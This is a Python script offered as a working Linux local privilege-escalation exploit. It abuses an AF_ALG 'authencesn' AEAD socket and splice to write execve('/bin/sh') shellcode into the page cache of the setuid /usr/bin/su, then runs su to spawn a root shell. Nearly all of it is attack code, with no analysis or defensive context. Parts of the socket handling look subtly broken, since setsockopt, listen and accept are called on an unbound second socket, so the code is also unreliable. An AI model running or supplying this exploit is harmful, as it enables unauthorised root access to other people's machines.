#!/usr/bin/env python3
import os
import sys
import socket
import struct
import fcntl
import array

TARGET = "/usr/bin/su"  # Target setuid binary
# Shellcode execve("/bin/sh") untuk x86_64
SHELLCODE = bytes([
    0x48, 0x31, 0xc9, 0x48, 0xf7, 0xe1, 0x48, 0x31, 0xd2, 0x48, 0xbb,
    0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb,
    0x08, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48,
    0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05
])

def copyfail_exploit():    
    print("[*] Writing shellcode to page cache...")
        # Step 1: Open target file read-only
    try:
        fd = os.open(TARGET, os.O_RDONLY)
    except Exception as e:
        print(f"[-] Cannot open {TARGET}: {e}")
        return False
        # Step 2: Create AF_ALG socket for AEAD
    try:
        sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
        sock.bind(('aead', 'authencesn(hmac(sha256),cbc(aes))'))
        
        op_sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
        op_sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_AEAD_AUTHSIZE, 16)
        op_sock.listen(0)
        op_sock, _ = op_sock.accept()
    except Exception as e:
        print(f"[-] AF_ALG setup failed: {e}")
        os.close(fd)
        return False
    
    # Step 3: Create pipe for splice
    r, w = os.pipe()
    
    # Step 4: Write shellcode in chunks
    chunk_size = 4
    shellcode_bytes = SHELLCODE
    
    for i in range(0, len(shellcode_bytes), chunk_size):
        chunk = shellcode_bytes[i:i+chunk_size]
        if len(chunk) < chunk_size:
            chunk = chunk + b'\x90' * (chunk_size - len(chunk))
        
        # Prepare AAD (Associated Authenticated Data)
        # 4 bytes filler + 4 bytes payload
        aad = b'\x00' * 4 + chunk
        
        # Step 5: Send payload via sendmsg with MSG_MORE
        op_sock.sendmsg([aad], [], socket.MSG_MORE)
        
        # Step 6: Splice file pages to socket
        fcntl.fcntl(r, fcntl.F_SETPIPE_SZ, 4096)
        os.splice(fd, None, w, None, 4096, 0)
        os.splice(r, None, op_sock.fileno(), None, 4096, 0)
        
        # Step 7: Trigger decryption (which writes to page cache)
        try:
            op_sock.recv(4096)
        except:
            pass
    
    # Cleanup
    op_sock.close()
    sock.close()
    os.close(r)
    os.close(w)
    os.close(fd)
    
    print("[+] Shellcode written to page cache")
    print(f"[+] Executing {TARGET}...")
    
    # Flush stdout and execute
    sys.stdout.flush()
    os.execv(TARGET, [TARGET])
    
    return True

if __name__ == "__main__":
    if os.geteuid() == 0:
        print("[!] Already root!")
        sys.exit(0)
    
    if not os.path.exists(TARGET):
        print(f"[-] {TARGET} not found!")
        print("[*] Edit TARGET variable to a setuid binary on your system")
        sys.exit(1)
    
    try:
        copyfail_exploit()
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        sys.exit(1)